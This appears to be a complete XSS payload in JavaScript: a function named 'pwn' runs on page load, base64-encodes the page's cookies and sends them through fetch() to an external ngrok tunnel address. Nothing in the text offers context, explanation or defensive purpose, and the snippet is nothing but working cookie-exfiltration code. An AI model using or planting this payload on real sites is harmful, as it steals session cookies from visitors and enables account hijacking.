async function pwn() {
    const res = await fetch('http://8.tcp.ngrok.io:16422/q?='+btoa(document.cookie));
}

window.onload = function() {
    pwn();
}
